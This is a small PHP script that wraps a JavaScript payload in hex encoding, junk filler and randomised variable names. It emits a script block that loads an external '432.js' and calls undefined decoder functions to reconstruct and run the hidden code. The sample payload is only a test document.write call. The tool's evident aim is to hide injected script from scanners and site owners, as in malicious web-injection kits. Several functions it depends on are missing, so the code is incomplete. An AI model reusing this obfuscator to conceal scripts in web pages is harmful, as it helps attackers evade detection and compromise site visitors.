<?php
if ($_GET['a']=="alert"){
_crypt("document.write('aTESTa');");
}

function cr_scape($orig){
$str='';
for ($i=0;$i<strlen($orig);$i++)
{$str.='kljf hdfk sdf'.dechex(ord($orig[$i]));}
$pipec = $str;
return $pipec;
}

function _esscape($orig){
$str='';
for ($i=0;$i<strlen($orig);$i++){
$a=$a+2;
$str.='%'.dechex(ord($orig[$i]));
}$ssoo = $str;
return $ssoo;}



function _crypt($ordSDd)
{
$xxxx = $ordSDd;
$rndcr_nm = get_random_string_array(rand(7,15), '15');

$crp_escap = $ordSDd;
$crp_escap = cr_scape(rawurlencode($crp_escap));
$crp_escap = chunk_split($crp_escap, 47, "\\\r\n");

$poxuy ="
<script type='text/javascript' src='432.js'></script>
<script>

var ".$rndcr_nm[1]." ='';
".$rndcr_nm[1]." = '".$crp_escap."';

rfower = ".$rndcr_nm[1].";

var dsl = jklsdjfk();

var ".$rndcr_nm[3]." ='%';

treos = jkshdk();

var ".$rndcr_nm[2]." = rewiry(rfower,".$rndcr_nm[3].");

".$rndcr_nm[2]." = dsl(".$rndcr_nm[2].");

var x = dsl(".$rndcr_nm[2]."); 
</script>
dsa sd
 sda asd asd asd


<script>treos(x);</script>";


$naxui = $poxuy;
if ($_GET['debug']=="1") $naxui = '<script>'.$xxxx.'</script>';

echo $naxui;

}

?>